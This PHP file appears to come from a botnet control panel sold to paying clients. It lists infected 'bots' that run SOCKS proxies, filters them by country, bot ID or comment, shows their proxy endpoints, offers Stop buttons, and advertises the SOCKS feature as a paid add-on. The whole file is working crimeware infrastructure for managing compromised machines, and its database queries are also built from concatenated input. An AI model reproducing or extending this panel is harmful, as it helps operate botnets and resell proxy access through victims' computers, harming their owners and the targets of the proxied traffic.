<?php

require_once("../dbget.php");

function get_socks_view($filter){

    $folder = explode("/", $_SERVER['REQUEST_URI'])[1];
    $json_path = "../../../clients/{$folder}/bot/client_cfg.json";

    $client_cfg = json_decode(file_get_contents($json_path), true);

	$client_id = $client_cfg['id'];
	
	if(!isset($client_cfg['mod_socks']) || !$client_cfg['mod_socks'])
	{
		
		$data = "<div style='padding: 20px'>
		<h2>Socks: <b style='color: red'>disabled</b></h2>
		<br />
		<p>Bots socks server is a separate paid function. 
		You can launch socks server in \"Bot details\" page.</p>
		<br />
		<p>Do you want to use socks server? Contact support and buy Socks feature now.</p>
		
		</div>";
		return $data;
	}


	global $link;

	global $_DB;
	// $dbName = $_DB["user"];
	$dbName = $_DB["name"];

	$country = '';
	if (isset($filter['country-select'])) $country = mysql_real_escape_string($filter['country-select'], $link);

	$show_botid = false;

	if (isset($filter['show-botid'])) $show_botid = true;

	if (!isset($filter['show-botid']) && !isset($filter['country-select'])){
		$show_botid = true;
	}


	$query = "SELECT count(`id`) FROM `general`.`socks` left join `$dbName`.`bots` on `$dbName`.`bots`.`botid` = `general`.`socks`.`botid` WHERE `is_online` = 1 AND  `general`.`socks`.`botid` in (`bots`.`botid`)";
	if ($country && $country != 'all'){
		$query .= " AND `country` = '$country'";
	}
	$res = mysql_query($query, $link);

	$active = 0;

	if ($res){
		$row = mysql_fetch_row($res);
		$active = intval($row[0]);
	}

	$result = <<<PHP
	<div style='margin: 20px'>
	<p style='text-align: left'>total active socks: <b>$active</b></p>
	</div>
PHP;

	$content = get_active_socks_data($filter);
	if ($content){
		$caption = $show_botid ? 'active socks' : '';
		// $caption = 'active socks';
		$result .= get_infoblock($caption, $content);
	}

	return $result;
}

function get_active_socks_data($filter){


	$country = isset($filter['country-select']) ? mysql_real_escape_string($filter['country-select']) : '';
	$show_botid = isset($filter['show-botid']) ? true : false;
	$botid = isset($filter['botid']) ? mysql_real_escape_string($filter['botid']) : '';
	$bot_comment = isset($filter['bot-comment']) ? mysql_real_escape_string($filter['bot-comment']) : '';

	if (!$country && !isset($filter['show-botid'])){
		$show_botid = true;
	}


	global $link;

	global $_DB;
	// $dbName = $_DB["user"];
	$dbName = $_DB["name"];

	// $query = "SELECT `general`.`socks`.`botid`, `general`.`socks`.`status`, `bots`.`lastip` FROM `general`.`socks` LEFT JOIN `bots` ON `bots`.`botid` COLLATE utf8_unicode_ci = `general`.`socks`.`botid` WHERE `is_online` = 1 AND  `general`.`socks`.`botid` COLLATE utf8_general_ci in (`bots`.`botid`)";

	// $query = "SELECT `general`.`socks`.`botid`, `general`.`socks`.`status`, `$dbName`.`bots`.`lastip` FROM `general`.`socks` LEFT JOIN `$dbName`.`bots` ON `$dbName`.`bots`.`botid` COLLATE utf8_unicode_ci = `general`.`socks`.`botid` WHERE `is_online` = 1 AND  `general`.`socks`.`botid` in (`bots`.`botid`)";
	$query = "SELECT `general`.`socks`.`botid`, `general`.`socks`.`status`, `$dbName`.`bots`.`lastip` FROM `general`.`socks` LEFT JOIN `$dbName`.`bots` ON `$dbName`.`bots`.`botid`  = `general`.`socks`.`botid` WHERE `is_online` = 1 AND  `general`.`socks`.`botid` in (`bots`.`botid`)";

	if ($botid) {
		$query .= " AND `general`.`socks`.`botid` = '$botid'";
	}
	else if ($bot_comment){
		$query .= " AND `$dbName`.`bots`.`comment` = '$bot_comment'";
	}
	else {
		if ($country && $country != 'all'){
			$query .= " AND `country` = '$country'";
		}
	}

	$res = mysql_query($query, $link);

	if ($res){

		if ($show_botid || $botid){
			$arr = array();
			$arr[] = array("<label for='check-all' style='cursor:pointer; padding-left:45%;'>All</label><input type='checkbox' id='check-all' style='visibility:hidden; width:0; height:0;' />", "", "", "<button id='stop-selected-bots'>Stop selected</button>");

			while ($row = mysql_fetch_row ($res)){
				$botid = $row[0];
	            $socks_status = $row[1];

				$socks_status = replace_socks_status($socks_status);
				$arr[] = array("<input type='checkbox' id='check-socks-$botid'>", "<a class=\"bots-table-botid\" id=\"bots-table-id-$botid\">$botid</a>", $socks_status, "<button class='socks-button' data-botid='$botid' data-param='stop'>Stop</button>");
				// $arr[] = array_merge($row, array("<button class='socks-button' data-botid='$botid' data-param='stop'>Stop</button>"));
			}

			return get_table_view(4,
				$arr,
				array('', 'ID', 'Status', ''),
				array());
		}

		else {
			$has_rows = false;
			$textarea = '<textarea style="width:50%; margin:5px;" rows="20%" onclick="this.focus(); this.select();">';
			while ($row = mysql_fetch_row($res)){
	            $socks_status = $row[1];

	            $socks_status = replace_socks_status($socks_status);
	            $textarea .= "$socks_status\r\n";
	            $has_rows = true;
			}

			$textarea .= "</textarea>";

			$html = $has_rows ? "<div style='width:100%; height:100%'>$textarea</div>" : "No data to display";
			return $html;
		}
	}
	else {
		// return mysql_error($link);
		return false;
	}

}


function get_socks_filter($filter){
	    $arr = array ();
    $classes = array ();

    $botid = '';
    if (isset($filter['botid'])) $botid = $filter['botid'];
    
    db_connect();

	global $link;

	global $_DB;

	$countries = array();

	$query = 'SELECT DISTINCT `country` from `bots` ORDER BY country';

	$res = mysql_query($query, $link);
	if ($res){
		while ($row = mysql_fetch_row($res)){
			if ($row[0] == '0'){
				continue;
			}
			$countries[] = $row[0];
		}
	}

	db_free();


    // $arr[] = '<input class="form-control" id="filter-botid" size="36" '
    //        . 'placeholder="Bot ID" type="text" value="'
    //        . $botid.'"></input>';


    $arr[] = '<input class="form-control" id="filter-botid" size="36" '
           . 'placeholder="Bot ID" type="text" value="'
           . $botid.'"></input>';
    $classes[] = "col-md-4";
    
    $arr[] = '<input class="form-control" id="filter-bot-comment" size="36" '
           . 'placeholder="Bot Comment" type="text" value="'
           . $botid.'"></input>';
    $classes[] = "col-md-4";
    

	$arrRow = '<label for="filter-country-select">country&nbsp;</label><select id="filter-country-select"><option value="all">all</option>';

	foreach ($countries as $country) {
		$arrRow .= "<option value='$country'>$country</option>";
	}

	$arrRow .= '</select>';

	// $arrRow .= '</div>';.

	$arr[] = $arrRow;

    $classes[] = "col-md-1";

    $arr[] = '<label for="filter-show-botid">show botid </label><input type="checkbox" checked="checked" id="filter-show-botid" style="width:20px"></input>';
    $classes[] = "col-md-1";
    
    $arr[] = '<button class="btn btn-sm" id="filter-apply">Apply</button>';
    $classes[] = "col-md-2";
    
    return get_filter_view ($arr, $classes);
}


function replace_socks_status($socks_status){
    if (isset($_SERVER["HTTP_X_FORWARDED_HOST"]))
	    $socks_status = str_replace("{{HOSTNAME}}", $_SERVER["HTTP_X_FORWARDED_HOST"], $socks_status);
	else
	    $socks_status = str_replace("{{HOSTNAME}}", $_SERVER["REMOTE_ADDR"], $socks_status);
	return $socks_status;
}

// SELECT DISTINCT ip, count(id) as len FROM socks_log GROUP BY ip